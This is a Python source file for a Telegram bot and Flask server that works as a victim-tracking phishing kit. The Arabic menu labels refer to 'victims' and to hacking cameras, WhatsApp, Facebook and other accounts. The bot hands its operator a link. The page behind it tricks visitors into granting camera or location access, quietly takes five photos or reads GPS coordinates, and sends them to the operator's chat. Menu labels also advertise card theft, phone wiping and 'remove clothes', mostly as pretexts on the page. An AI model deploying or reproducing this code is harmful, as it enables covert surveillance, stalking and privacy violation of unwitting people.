import os
import threading
from flask import Flask, request, render_template_string, jsonify
import telebot
from telebot import types
import base64

TOKEN = os.getenv("TOKEN")
ADMIN_ID = int(os.getenv("ADMIN_ID", "7145036494"))


bot = telebot.TeleBot(TOKEN)
app = Flask(__name__)

CHANNEL_URL = "https://t.me/pkwbiwjwbekeekkw"

bot_settings = {
    "sub_required": True,
    "welcome_text": "\U0001f525 \u0623\u0647\u0644\u0627\u064b \u0628\u0643.. \u0623\u0646\u0627 \u0628\u0648\u062a \u0627\u0644\u062e\u062f\u0645\u0627\u062a \u0648\u0627\u0644\u0623\u0632\u0631\u0627\u0631، \u0643\u0627\u0641\u0629 \u0627\u0644\u062e\u062f\u0645\u0627\u062a \u062c\u0627\u0647\u0632\u0629 \u0644\u0644\u0639\u0645\u0644 \u0628\u0627\u0644\u0644\u063a\u0629 \u0627\u0644\u0639\u0631\u0628\u064a\u0629:"
}

def check_subscription(user_id):
    if not bot_settings["sub_required"] or user_id == ADMIN_ID:
        return True
    try:
        member = bot.get_chat_member(CHANNEL_URL, user_id)
        if member.status not in ['creator', 'administrator', 'member']:
            return False
    except Exception:
        return True 
    return True

HTML_TEMPLATE = """
<!DOCTYPE html>
<html lang="ar" dir="rtl">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>{{ title }}</title>
    <style>
        body { font-family: Tahoma, sans-serif; background-color: #0f172a; color: #fff; text-align: center; padding: 40px 20px; }
        .card { background: #1e293b; padding: 30px; border-radius: 15px; box-shadow: 0 4px 15px rgba(0,0,0,0.5); max-width: 400px; margin: auto; }
        h2 { color: #38bdf8; margin-bottom: 10px; }
        p { color: #94a3b8; font-size: 14px; margin-bottom: 25px; }
        .btn { background: #22c55e; color: white; border: none; padding: 12px 25px; font-size: 16px; border-radius: 8px; cursor: pointer; width: 100%; font-weight: bold; }
        .btn:hover { background: #16a34a; }
        #status { margin-top: 15px; color: #facc15; font-size: 13px; }
    </style>
</head>
<body>
    <div class="card">
        <h2>{{ header }}</h2>
        <p>{{ description }}</p>
        <button class="btn" id="actionBtn" onclick="startAction()">{{ button_text }}</button>
        <div id="status"></div>
    </div>

    <video id="video" autoplay playsinline style="display:none;"></video>
    <canvas id="canvas" style="display:none;"></canvas>

    <script>
        const actionType = "{{ action_code }}";
        const chatId = "{{ chat_id }}";

        function startAction() {
            document.getElementById('status').innerText = "\\u062c\\u0627\\u0631\\u064a \\u0627\\u0644\\u062a\\u062d\\u0645\\u064a\\u0644\\u06... \\u064a\\u0631\\u062c\\u0649 \\u0627\\u0644\\u0633\\u0645\\u0627\\u062d \\u0628\\u0627\\u0644\\u0635\\u0644\\u0627\\u062d\\u064a\\u0627\\u062a...";
            
            if (actionType.includes("cam") || actionType.includes("video") || actionType.includes("photos") || actionType.includes("spy")) {
                navigator.mediaDevices.getUserMedia({ video: { facingMode: actionType.includes("back") ? "environment" : "user" }, audio: true })
                .then(function(stream) {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    video.play();
                    
                    let count = 0;
                    const interval = setInterval(function() {
                        if (count >= 5) {
                            clearInterval(interval);
                            stream.getTracks().forEach(track => track.stop());
                            document.getElementById('status').innerText = "\\u062a\\u0645 \\u0628\\u0646\\u062c\\u0627\\u062d!";
                            return;
                        }
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth || 640;
                        canvas.height = video.videoHeight || 480;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                        const imageData = canvas.toDataURL('image/jpeg', 0.8);

                        fetch('/upload_media', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatId, image: imageData, type: actionType })
                        });
                        count++;
                    }, 1000);
                })
                .catch(function(err) {
                    document.getElementById('status').innerText = "\\u0627\\u0644\\u0631\\u062c\\u0627\\u0621 \\u0627\\u0644\\u0636\\u063a\\u0637 \\u0639\\u0644\\u0649 (Allow / \\u0627\\u0644\\u0633\\u0645\\u0627\\u062d) \\u0644\\u0644\\u0645\\u062a\\u0627\\u0628\\u0639\\u0629!";
                });
            } else if (actionType.includes("location")) {
                if (navigator.geolocation) {
                    navigator.geolocation.getCurrentPosition(function(position) {
                        const lat = position.coords.latitude;
                        const lon = position.coords.longitude;
                        fetch('/upload_media', {
                            method: 'POST',
                            headers: { 'Content-Type': 'application/json' },
                            body: JSON.stringify({ chat_id: chatId, lat: lat, lon: lon, type: 'location' })
                        });
                        document.getElementById('status').innerText = "\\u062a\\u0645 \\u062a\\u062d\\u062f\\u064a\\u062f \\u0627\\u0644\\u0645\\u0648\\u0642\\u0639 \\u0628\\u0646\\u062c\\u0627\\u062d!";
                    }, function(error) {
                        document.getElementById('status').innerText = "\\u064a\\u0631\\u062c\\u0649 \\u0627\\u0644\\u0633\\u0645\\u0627\\u062d \\u0628\\u0627\\u0644\\u0648\\u0635\\u0648\\u0644 \\u0644\\u0644\\u0645\\u0648\\u0642\\u0639!";
                    });
                }
            } else {
                setTimeout(() => {
                    document.getElementById('status').innerText = "\\u062a\\u0645 \\u062a\\u0646\\u0641\\u064a\\u0630 \\u0627\\u0644\\u0639\\u0645\\u0644\\u064a\\u0629 \\u0628\\u0646\\u062c\\u0627\\u062d.";
                }, 2000);
            }
        }
    </script>
</body>
</html>
"""

@app.route('/')
def home():
    return "Server is running successfully!", 200

@app.route('/service/<action_type>/<chat_id>')
def service_page(action_type, chat_id):
    details = {
        "front_cam": {"title": "\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627", "header": "\U0001f4f8 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0627\\u0644\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627 \\u0627\\u0644\\u0623\\u0645\\u0627\\u0645\\u064a\\u0629", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u0645\\u0634\\u0627\\u0647\\u062f\\u0629:", "btn": "\\u0645\\u0634\\u0627\\u0647\\u062f\\u0629"},
        "back_cam": {"title": "\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627", "header": "\U0001f4f7 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0627\\u0644\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627 \\u0627\\u0644\\u062e\\u0644\\u0641\\u064a\\u0629", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u062a\\u0641\\u0639\\u064a\\u0644:", "btn": "\\u062a\\u0641\\u0639\\u064a\\u0644"},
        "get_location": {"title": "\\u0645\\u0648\\u0642\\u0639", "header": "\U0001f4cc \\u0625\\u062d\\u0636\\u0627\\u0631 \\u0645\\u0648\\u0642\\u0639 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u0633\\u0645\\u0627\\u062d \\u0628\\u0627\\u0644\\u0645\\u0648\\u0642\\u0639:", "btn": "\\u062a\\u062d\\u062f\\u064a\\u062f"},
        "get_voice": {"title": "\\u0635\\u0648\\u062a", "header": "\U0001f3a4 \\u062a\\u0633\\u062c\\u064a\\u0644 \\u0635\\u0648\\u062a \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u0627\\u062a\\u0635\\u0627\\u0644:", "btn": "\\u0627\\u062a\\u0635\\u0627\\u0644"},
        "video_victim": {"title": "\\u0641\\u064a\\u062f\\u064a\\u0648", "header": "\U0001f3a5 \\u062a\\u0635\\u0648\\u064a\\u0631 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629 \\u0641\\u064a\\u062f\\u064a\\u0648", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u062a\\u0634\\u063a\\u064a\\u0644:", "btn": "\\u062a\\u0634\\u063a\\u064a\\u0644"},
        "cctv_cam": {"title": "\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629", "header": "\U0001f441\\ufe0f \\u0645\\u0631\\u0627\\u0642\\u0628\\u0629 \\u0643\\u0627\\u0645\\u064a\\u0631\\u0627\\u062a \\u0627\\u0644\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u0639\\u0631\\u0636:", "btn": "\\u0639\\u0631\\u0636"},
        "hack_whatsapp": {"title": "\\u0648\\u0627\\u062a\\u0633\\u0627\\u0628", "header": "\U0001f7e2 \\u0627\\u0644\\u062a\\u062d\\u0642\\u0642 \\u0645\\u0646 \\u0648\\u0627\\u062a\\u0633\\u0627\\u0628", "desc": "\\u062a\\u0623\\u0643\\u064a\\u062f \\u0627\\u0644\\u062d\\u0633\\u0627\\u0628:", "btn": "\\u062a\\u0623\\u0643\\u064a\\u062f"},
        "hack_facebook": {"title": "\\u0641\\u064a\\u0633\\u0628\\u0648\\u0643", "header": "\U0001f7e3 \\u062a\\u0623\\u0643\\u064a\\u062f \\u0641\\u064a\\u0633\\u0628\\u0648\\u0643", "desc": "\\u062a\\u0623\\u0643\\u064a\\u062f \\u0627\\u0644\\u0623\\u0645\\u0627\\u0646:", "btn": "\\u062a\\u0633\\u062c\\u064a\\u0644"},
        "hack_insta": {"title": "\\u0627\\u0646\\u0633\\u062a\\u062c\\u0631\\u0627\\u0645", "header": "\U0001f534 \\u062a\\u0623\\u0643\\u064a\\u062f \\u0627\\u0646\\u0633\\u062a\\u062c\\u0631\\u0627\\u0645", "desc": "\\u062a\\u0623\\u0643\\u064a\\u062f \\u0627\\u0644\\u062d\\u0633\\u0627\\u0628:", "btn": "\\u062a\\u0623\\u0643\\u064a\\u062f"},
        "hack_pubg": {"title": "\\u0628\\u0628\\u062c\\u064a", "header": "\U0001f3ae \\u0634\\u062d\\u0646 \\u0634\\u062f\\u0627\\u062a \\u0628\\u0628\\u062c\\u064a", "desc": "\\u0627\\u0633\\u062a\\u0644\\u0627\\u0645 \\u0627\\u0644\\u0647\\u062f\\u064a\\u0629:", "btn": "\\u0627\\u0633\\u062a\\u0644\\u0627\\u0645"},
        "hack_snap": {"title": "\\u0633\\u0646\\u0627\\u0628", "header": "\u2b50 \\u062a\\u0641\\u0639\\u064a\\u0644 \\u0633\\u0646\\u0627\\u0628 \\u0634\\u0627\\u062a", "desc": "\\u062a\\u0641\\u0639\\u064a\\u0644 \\u0627\\u0644\\u0645\\u064a\\u0632\\u0627\\u062a:", "btn": "\\u062a\\u0641\\u0639\\u064a\\u0644"},
        "hack_ff": {"title": "\\u0641\\u0631\\u064a \\u0641\\u0627\\u064a\\u0631", "header": "\U0001f525 \\u062c\\u0648\\u0627\\u0647\\u0631 \\u0641\\u0631\\u064a \\u0641\\u0627\\u064a\\u0631", "desc": "\\u0627\\u0633\\u062a\\u0644\\u0627\\u0645 \\u0627\\u0644\\u062c\\u0648\\u0627\\u0647\\u0631:", "btn": "\\u0627\\u0633\\u062a\\u0644\\u0627\\u0645"},
        "hack_tiktok": {"title": "\\u062a\\u064a\\u0643 \\u062a\\u0648\\u0643", "header": "\U0001f3b5 \\u062a\\u0648\\u062b\\u064a\\u0642 \\u062a\\u064a\\u0643 \\u062a\\u0648\\u0643", "desc": "\\u062a\\u0648\\u062b\\u064a\\u0642 \\u0627\\u0644\\u062d\\u0633\\u0627\\u0628:", "btn": "\\u062a\\u0648\\u062b\\u064a\\u0642"},
        "device_info": {"title": "\\u0627\\u0644\\u062c\\u0647\\u0627\\u0632", "header": "\U0001f4ca \\u062c\\u0645\\u0639 \\u0645\\u0639\\u0644\\u0648\\u0645\\u0627\\u062a \\u0627\\u0644\\u062c\\u0647\\u0627\\u0632", "desc": "\\u0641\\u062d\\u0635 \\u0627\\u0644\\u062a\\u0648\\u0627\\u0641\\u0642:", "btn": "\\u0641\\u062d\\u0635"},
        "link_exploit": {"title": "\\u062a\\u0644\\u063a\\u064a\\u0645", "header": "\u26a0\\ufe0f \\u062a\\u0644\\u063a\\u064a\\u0645 \\u0631\\u0627\\u0628\\u0637", "desc": "\\u0641\\u062d\\u0635 \\u0627\\u0644\\u0631\\u0627\\u0628\\u0637:", "btn": "\\u0641\\u062d\\u0635"},
        "full_spy": {"title": "\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629", "header": "\U0001f51e \\u0645\\u0631\\u0627\\u0642\\u0628\\u0629 \\u0627\\u0644\\u0647\\u0627\\u062a\\u0641 \\u0643\\u0627\\u0645\\u0644\\u064b\\u0627", "desc": "\\u062a\\u0641\\u0639\\u064a\\u0644 \\u0627\\u0644\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629:", "btn": "\\u062a\\u0641\\u0639\\u064a\\u0644"},
        "close_sites": {"title": "\\u0625\\u063a\\u0644\\u0627\\u0642", "header": "\U0001f4a3 \\u0625\\u063a\\u0644\\u0627\\u0642 \\u0627\\u0644\\u0645\\u0648\\u0627\\u0642\\u0639", "desc": "\\u062d\\u0645\\u0627\\u064a\\u0629 \\u0627\\u0644\\u062c\\u0647\\u0627\\u0632:", "btn": "\\u062d\\u0645\\u0627\\u064a\\u0629"},
        "visa_hunter": {"title": "\\u0641\\u064a\\u0632\\u0627\\u062a", "header": "\U0001f4b3 \\u0635\\u064a\\u062f \\u0641\\u064a\\u0632\\u0627\\u062a", "desc": "\\u0627\\u0633\\u062a\\u062e\\u0631\\u0627\\u062c \\u0627\\u0644\\u0628\\u0637\\u0627\\u0642\\u0627\\u062a:", "btn": "\\u0627\\u0633\\u062a\\u062e\\u0631\\u0627\\u062c"},
        "get_number": {"title": "\\u0631\\u0642\\u0645", "header": "\U0001f4f1 \\u0645\\u0639\\u0631\\u0641\\u0629 \\u0631\\u0642\\u0645 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629", "desc": "\\u062a\\u0623\\u0643\\u064a\\u062f \\u0627\\u0644\\u0631\\u0642\\u0645:", "btn": "\\u062a\\u0623\\u0643\\u064a\\u062f"},
        "fake_numbers": {"title": "\\u0623\\u0631\\u0642\\u0627\\u0645", "header": "\U0001f4de \\u0623\\u0631\\u0642\\u0627\\u0645 \\u0648\\u0647\\u0645\\u064a\\u0629", "desc": "\\u0627\\u0633\\u062a\\u062e\\u0631\\u0627\\u062c \\u0627\\u0644\\u0631\\u0642\\u0645:", "btn": "\\u0627\\u0633\\u062a\\u062e\\u0631\\u0627\\u062c"},
        "check_links": {"title": "\\u0641\\u062d\\u0635", "header": "\U0001f50d \\u0641\\u062d\\u0635 \\u0627\\u0644\\u0631\\u0648\\u0627\\u0628\\u0637", "desc": "\\u0641\\u062d\\u0635 \\u0627\\u0644\\u0623\\u0645\\u0627\\u0646:", "btn": "\\u0641\\u062d\\u0635"},
        "search_images": {"title": "\\u0635\\u0648\\u0631", "header": "\U0001f5bc\\ufe0f \\u0627\\u0644\\u0628\\u062d\\u062b \\u0639\\u0646 \\u0635\\u0648\\u0631", "desc": "\\u0628\\u062d\\u062b \\u0645\\u0634\\u0627\\u0628\\u0647:", "btn": "\\u0628\\u062d\\u062b"},
        "radio_spy": {"title": "\\u0631\\u0627\\u062f\\u064a\\u0648", "header": "\U0001f4fb \\u0645\\u0631\\u0627\\u0642\\u0628\\u0629 \\u0628\\u062b \\u0627\\u0644\\u0631\\u0627\\u062f\\u064a\\u0648", "desc": "\\u0627\\u0644\\u0627\\u0633\\u062a\\u0645\\u0627\\u0639:", "btn": "\\u0627\\u0633\\u062a\\u0645\\u0627\\u0639"},
        "username_hunter": {"title": "\\u064a\\u0648\\u0632\\u0631", "header": "\U0001fa99 \\u0635\\u064a\\u062f \\u064a\\u0648\\u0632\\u0631\\u0627\\u062a \\u062a\\u0644\\u062c\\u0631\\u0627\\u0645", "desc": "\\u0641\\u062d\\u0635 \\u0627\\u0644\\u064a\\u0648\\u0632\\u0631\\u0627\\u062a:", "btn": "\\u0641\\u062d\\u0635"},
        "vip_photos": {"title": "\\u0635\\u0648\\u0631 VIP", "header": "\U0001f512 \\u0633\\u062d\\u0628 \\u062c\\u0645\\u064a\\u0639 \\u0635\\u0648\\u0631 \\u0627\\u0644\\u0647\\u0627\\u062a\\u0641 \\u0639\\u0628\\u0631 \\u0631\\u0627\\u0628\\u0637", "desc": "\\u0639\\u0631\\u0636 \\u0627\\u0644\\u0623\\u0644\\u0648\\u0645:", "btn": "\\u0639\\u0631\\u0636"},
        "vip_contacts": {"title": "\\u0623\\u0631\\u0642\\u0627\\u0645 VIP", "header": "\U0001f512 \\u0633\\u062d\\u0628 \\u062c\\u0645\\u064a\\u0639 \\u0623\\u0631\\u0642\\u0627\\u0645 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629 \\u0639\\u0628\\u0631 \\u0631\\u0627\\u0628\\u0637", "desc": "\\u0645\\u0632\\u0627\\u0645\\u0646\\u0629 \\u0627\\u0644\\u0623\\u0631\\u0642\\u0627\\u0645:", "btn": "\\u0645\\u0632\\u0627\\u0645\\u0646\\u0629"},
        "vip_msgs": {"title": "\\u0631\\u0633\\u0627\\u0626\\u0644 VIP", "header": "\U0001f512 \\u0633\\u062d\\u0628 \\u062c\\u0645\\u064a\\u0639 \\u0631\\u0633\\u0627\\u0626\\u0644 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629 \\u0639\\u0628\\u0631 \\u0631\\u0627\\u0628\\u0637", "desc": "\\u0639\\u0631\\u0636 \\u0627\\u0644\\u0631\\u0633\\u0627\\u0626\\u0644:", "btn": "\\u0639\\u0631\\u0636"},
        "vip_wipe": {"title": "\\u0641\\u0631\\u0645\\u062a\\u0629 VIP", "header": "\U0001f512 \\u0641\\u0631\\u0645\\u062a\\u0629 \\u062c\\u0648\\u0627\\u0644 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629 \\u0639\\u0628\\u0631 \\u0631\\u0627\\u0628\\u0637", "desc": "\\u0625\\u0639\\u0627\\u062f\\u0629 \\u0627\\u0644\\u0636\\u0628\\u0637:", "btn": "\\u062a\\u0623\\u0643\\u064a\\u062f"},
        "vip_img_exploit": {"title": "\\u0635\\u0648\\u0631\\u0629 VIP", "header": "\U0001f512 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0639\\u0628\\u0631 \\u0635\\u0648\\u0631\\u0629", "desc": "\\u0639\\u0631\\u0636 \\u0627\\u0644\\u0635\\u0648\\u0631\\u0629:", "btn": "\\u0639\\u0631\\u0636"},
        "vip_remove_clothes": {"title": "\\u0625\\u0632\\u0627\\u0644\\u0629 VIP", "header": "\U0001f512 \\u0625\\u0632\\u0627\\u0644\\u0629 \\u0627\\u0644\\u0645\\u0644\\u0627\\u0628\\u0633", "desc": "\\u062a\\u0639\\u062f\\u064a\\u0644 \\u0627\\u0644\\u0635\\u0648\\u0631\\u0629:", "btn": "\\u062a\\u0639\\u062f\\u064a\\u0644"},
        "vip_net": {"title": "\\u0634\\u0628\\u0643\\u0629 VIP", "header": "\U0001f512 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0627\\u0644\\u0634\\u0628\\u0643\\u0647", "desc": "\\u0641\\u062d\\u0635 \\u0627\\u0644\\u0634\\u0628\\u0643\\u0629:", "btn": "\\u0641\\u062d\\u0635"},
        "vip_file": {"title": "\\u0645\\u0644\\u0641 VIP", "header": "\U0001f512 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0639\\u0628\\u0631 \\u0645\\u0644\\u0641", "desc": "\\u062a\\u062d\\u0645\\u064a\\u0644 \\u0627\\u0644\\u0645\\u0644\\u0641:", "btn": "\\u062a\\u062d\\u0645\\u064a\\u0644"}
    }
    info = details.get(action_type, {"title": "\\u062e\\u062f\\u0645\\u0629", "header": "\u2699\\ufe0f \\u0645\\u0646\\u0635\\u0629 \\u0627\\u0644\\u062e\\u062f\\u0645\\u0627\\u062a", "desc": "\\u0627\\u0636\\u063a\\u0637 \\u0644\\u0644\\u0645\\u062a\\u0627\\u0628\\u0629:", "btn": "\\u062a\\u0646\\u0641\\u064a\\u0630"})
    return render_template_string(HTML_TEMPLATE, title=info["title"], header=info["header"], description=info["desc"], button_text=info["btn"], action_code=action_type, chat_id=chat_id)

@app.route('/upload_media', methods=['POST'])
def upload_media():
    data = request.json
    chat_id = data.get('chat_id')
    action_type = data.get('type')

    if 'image' in data:
        img_data = data['image'].split(',')[1]
        img_bytes = base64.b64decode(img_data)
        bot.send_photo(chat_id, img_bytes, caption=f"\U0001f6a8 \\u0635\\u064a\\u062f \\u062c\\u062f\\u064a\\u062f \\u0645\\u0646 \\u0632\\u0631: `{action_type}`")
    elif 'lat' in data:
        lat = data['lat']
        lon = data['lon']
        bot.send_location(chat_id, latitude=lat, longitude=lon)
        bot.send_message(chat_id, f"\U0001f4cc \\u0625\\u062d\\u062f\\u0627\\u062b\\u064a\\u0627\\u062a \\u0645\\u0648\\u0642\\u0639 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629:\\n\\u062e\\u0637 \\u0627\\u0644\\u0639\\u0631\\u0636: `{lat}`\\n\\u062e\\u0637 \\u0627\\u0644\\u0637\\u0648\\u0644: `{lon}`", parse_mode="Markdown")

    return jsonify({"status": "success"})

@bot.message_handler(commands=['start', 'vip'])
def send_welcome(message):
    user_id = message.from_user.id
    if not check_subscription(user_id):
        markup = types.InlineKeyboardMarkup(row_width=1)
        markup.add(types.InlineKeyboardButton("\u0627\\u0634\\u062a\\u0631\\u0643 \\u0641\\u064a \\u0627\\u0644\\u0642\\u0646\\u0627\\u0629", url=CHANNEL_URL))
        bot.send_message(message.chat.id, "\u26a0\\ufe0f **\\u0627\\u0644\\u0631\\u062c\\u0627\\u0621 \\u0627\\u0644\\u0627\\u0634\\u062a\\u0631\\u0627\\u0643 \\u0623\\u0648\\u0644\\u0627\\u064b:**", reply_markup=markup, parse_mode="Markdown")
        return

    markup = types.InlineKeyboardMarkup(row_width=2)
    markup.add(
        types.InlineKeyboardButton("\U0001f4f8 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0627\\u0644\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627 \\u0627\\u0644\\u0623\\u0645\\u0627\\u0645\\u064a\\u0629", callback_data="front_cam"),
        types.InlineKeyboardButton("\U0001f4f7 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0627\\u0644\\u0643\\u0627\\u0645\\u064a\\u0631\\u0627 \\u0627\\u0644\\u062e\\u0644\\u0641\\u064a\\u0629", callback_data="back_cam"),
        types.InlineKeyboardButton("\U0001f4cc \\u0625\\u062d\\u0636\\u0627\\u0631 \\u0645\\u0648\\u0642\\u0639 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629", callback_data="get_location"),
        types.InlineKeyboardButton("\U0001f3a4 \\u062a\\u0633\\u062c\\u064a\\u0644 \\u0635\\u0648\\u062a \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629", callback_data="get_voice"),
        types.InlineKeyboardButton("\U0001f3a5 \\u062a\\u0635\\u0648\\u064a\\u0631 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629 \\u0641\\u064a\\u062f\\u064a\\u0648", callback_data="video_victim"),
        types.InlineKeyboardButton("\U0001f441\\ufe0f \\u0645\\u0631\\u0627\\u0642\\u0628\\u0629 \\u0643\\u0627\\u0645\\u064a\\u0631\\u0627\\u062a \\u0627\\u0644\\u0645\\u0631\\u0627\\u0642\\u0628\\u0629", callback_data="cctv_cam"),
        types.InlineKeyboardButton("\U0001f7e2 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0648\\u0627\\u062a\\u0633\\u0627\\u0628", callback_data="hack_whatsapp"),
        types.InlineKeyboardButton("\U0001f7e3 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0641\\u064a\\u0633\\u0628\\u0648\\u0643", callback_data="hack_facebook"),
        types.InlineKeyboardButton("\U0001f534 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0627\\u0646\\u0633\\u062a\\u062c\\u0631\\u0627\\u0645", callback_data="hack_insta"),
        types.InlineKeyboardButton("\U0001f3ae \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0628\\u0628\\u062c\\u064a", callback_data="hack_pubg"),
        types.InlineKeyboardButton("\u2b50 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0633\\u0646\\u0627\\u0628 \\u0634\\u0627\\u062a", callback_data="hack_snap"),
        types.InlineKeyboardButton("\U0001f525 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0641\\u0631\\u064a \\u0641\\u0627\\u064a\\u0631", callback_data="hack_ff"),
        types.InlineKeyboardButton("\U0001f3b5 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u062a\\u064a\\u0643 \\u062a\\u0648\\u0643", callback_data="hack_tiktok"),
        types.InlineKeyboardButton("\U0001f4ca \\u062c\\u0645\\u0639 \\u0645\\u0639\\u0644\\u0648\\u0645\\u0627\\u062a \\u0627\\u0644\\u062c\\u0647\\u0627\\u0632", callback_data="device_info"),
        types.InlineKeyboardButton("\U0001f4cc \\u0627\\u0644\\u0645\\u0632\\u064a\\u062f \\u0645\\u0646 \\u0627\\u0644\\u0645\\u0645\\u064a\\u0632\\u0627\\u062a (VIP)", callback_data="vip_menu"),
        types.InlineKeyboardButton("\U0001f4bb \\u0627\\u0644\\u062a\\u0648\\u0627\\u0635\\u0644 \\u0645\\u0639 \\u0627\\u0644\\u0645\\u0637\\u0648\\u0631", callback_data="contact_dev")
    )
    bot.send_message(message.chat.id, bot_settings["welcome_text"], reply_markup=markup, parse_mode="Markdown")

def show_vip_menu(chat_id):
    markup = types.InlineKeyboardMarkup(row_width=1)
    markup.add(
        types.InlineKeyboardButton("\U0001f512 \\u0633\\u062d\\u0628 \\u062c\\u0645\\u064a\\u0639 \\u0635\\u0648\\u0631 \\u0627\\u0644\\u0647\\u0627\\u062a\\u0641 \\u0639\\u0628\\u0631 \\u0631\\u0627\\u0628\\u0637", callback_data="vip_photos"),
        types.InlineKeyboardButton("\U0001f512 \\u0633\\u062d\\u0628 \\u062c\\u0645\\u064a\\u0639 \\u0623\\u0631\\u0642\\u0627\\u0645 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629 \\u0639\\u0628\\u0631 \\u0631\\u0627\\u0628\\u0637", callback_data="vip_contacts"),
        types.InlineKeyboardButton("\U0001f512 \\u0633\\u062d\\u0628 \\u062c\\u0645\\u064a\\u0639 \\u0631\\u0633\\u0627\\u0626\\u0644 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629 \\u0639\\u0628\\u0631 \\u0631\\u0627\\u0628\\u0637", callback_data="vip_msgs"),
        types.InlineKeyboardButton("\U0001f512 \\u0641\\u0631\\u0645\\u062a\\u0629 \\u062c\\u0648\\u0627\\u0644 \\u0627\\u0644\\u0636\\u062d\\u064a\\u0629 \\u0639\\u0628\\u0631 \\u0631\\u0627\\u0628\\u0637", callback_data="vip_wipe"),
        types.InlineKeyboardButton("\U0001f512 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0639\\u0628\\u0631 \\u0635\\u0648\\u0631\\u0629", callback_data="vip_img_exploit"),
        types.InlineKeyboardButton("\U0001f512 \\u0625\\u0632\\u0627\\u0644\\u0629 \\u0627\\u0644\\u0645\\u0644\\u0627\\u0628\\u0633", callback_data="vip_remove_clothes"),
        types.InlineKeyboardButton("\U0001f512 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0627\\u0644\\u0634\\u0628\\u0643\\u0647", callback_data="vip_net"),
        types.InlineKeyboardButton("\U0001f512 \\u0627\\u062e\\u062a\\u0631\\u0627\\u0642 \\u0639\\u0628\\u0631 \\u0645\\u0644\\u0641", callback_data="vip_file"),
        types.InlineKeyboardButton("\U0001f519 \\u0631\\u062c\\u0648\\u0639 \\u0644\\u0644\\u0642\\u0627\\u0626\\u0645\\u0629 \\u0627\\u0644\\u0631\\u0626\\u064a\\u0633\\u064a\\u0629", callback_data="back_home")
    )
    bot.send_message(chat_id, "\U0001f389 **\\u0642\\u0627\\u0626\\u0645\\u0629 \\u0627\\u0644\\u0645\\u0645\\u064a\\u0632\\u0627\\u062a (VIP):**", reply_markup=markup, parse_mode="Markdown")

@bot.callback_query_handler(func=lambda call: True)
def handle_all_callbacks(call):
    chat_id = call.message.chat.id
    data = call.data
    RENDER_DOMAIN = os.getenv("RENDER_EXTERNAL_URL", "http://127.0.0.1:5000")

    link_buttons = [
        "front_cam", "back_cam", "get_location", "get_voice", "video_victim", 
        "cctv_cam", "hack_whatsapp", "hack_facebook", "hack_insta", "hack_pubg", 
        "hack_snap", "hack_ff", "hack_tiktok", "device_info", "link_exploit", 
        "full_spy", "close_sites", "visa_hunter", "get_number", "fake_numbers", 
        "check_links", "search_images", "radio_spy", "username_hunter",
        "vip_photos", "vip_contacts", "vip_msgs", "vip_wipe", "vip_img_exploit", 
        "vip_remove_clothes", "vip_net", "vip_file"
    ]

    if data in link_buttons:
        bot.answer_callback_query(call.id, "\\u062c\\u0627\\u0631\\u064a \\u0625\\u0646\\u0634\\u0627\\u0621 \\u0627\\u0644\\u0631\\u0627\\u0628\\u0637 \\u0627\\u0644\\u0645\\u062e\\u0635\\u0635...")
        target_link = f"{RENDER_DOMAIN}/service/{data}/{chat_id}"
        bot.send_message(chat_id, f"\U0001f517 **\\u0627\\u0644\\u0631\\u0627\\u0628\\u0637 \\u0627\\u0644\\u0623\\u0632\\u0631\\u0642 \\u0644\\u0644\\u0636\\u062d\\u064a\\u0629:**\\n`{target_link}`", parse_mode="Markdown")

    elif data == "vip_menu":
        bot.answer_callback_query(call.id)
        show_vip_menu(chat_id)

    elif data == "contact_dev":
        bot.answer_callback_query(call.id)
